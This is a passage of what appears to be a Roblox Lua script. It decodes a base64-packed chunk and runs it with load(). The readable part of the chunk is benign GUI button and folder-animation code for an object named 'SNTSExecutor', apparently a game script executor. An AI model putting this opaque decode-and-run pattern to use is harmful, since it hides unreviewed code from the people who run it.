lbmQKCQlpc0FuaW1hdGluZyA9IHRydWUKCQoJCWxvY2FsIGZvbGRlciA9IFNOVFNFeGVjdXRvcjpGaW5kRmlyc3RDaGlsZChidXR0b25OYW1lKQoJCWlmIG5vdCBmb2xkZXIgdGhlbgoJCQktLSB3YXJuKCJGb2xkZXIgbm90IGZvdW5kOiIsIGJ1dHRvbk5hbWUpCgkJCWlzQW5pbWF0aW5nID0gZmFsc2UKCQkJcmV0dXJuCgkJZW5kCgkKCQlpZiBvcGVuU2VjdGlvbiA9PSBidXR0b25OYW1lIHRoZW4KCQkJdHdlZW5PdXQoZm9sZGVyKQoJCQlvcGVuU2VjdGlvbiA9IG5pbAoJCWVsc2UKCQkJaGlkZUFsbEZvbGRlcnMoYnV0dG9uTmFtZSkKCQkJdHdlZW5Jbihmb2xkZXIpCgkJCW9wZW5TZWN0aW9uID0gYnV0dG9uTmFtZQoJCWVuZAoJCgkJdGFzay5kZWxheSgwLjM1LCBmdW5jdGlvbigpCgkJCWlzQW5pbWF0aW5nID0gZmFsc2UKCQllbmQpCgllbmQKCQoJLS0gIENvbm5lY3QgYnV0dG9ucwoJZm9yIGksIG5hbWUgaW4gYnV0dG9uTmFtZXMgZG8KCQlsb2NhbCBidG4gPSBOYXZpZ2F0b3I6RmluZEZpcnN0Q2hpbGQobmFtZSkKCQlpZiBidG4gYW5kIGJ0bjpJc0EoIkd1aUJ1dHRvbiIpIHRoZW4KCQkJLS0gcHJpbnQoIkhvb2tlZCBidXR0b246IiwgbmFtZSkgLS0gZGVidWcgcHJpbnQKCQkJYnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJLS0gcHJpbnQoIkNsaWNrZWQ6IiwgbmFtZSkgLS0gZGVidWcgcHJpbnQKCQkJCW9uTmF2QnV0dG9uQ2xpY2sobmFtZSkKCQkJZW5kKQoJCWVsc2UKCQkJLS0gd2FybigiQnV0dG9uIG5vdCBmb3VuZCBvciBub3QgYSBHdWlCdXR0b246IiwgbmFtZSkKCQllbmQKCWVuZAoJCgktLSBIaWRlIGFsbCBvbiBpbml0CgloaWRlQWxsRm9sZGVycygpCgkKCQplbmQ7CnRhc2suc3Bhd24oQ18xOGYpOwoKcmV0dXJuIEcyTFsiMSJdLCByZXF1aXJlOw==]] -- Use [[...]] long string literals for reliable parsing of the packed code
local D = B64Decode(S)
local F = load(D)
if F then
    F()
else

end
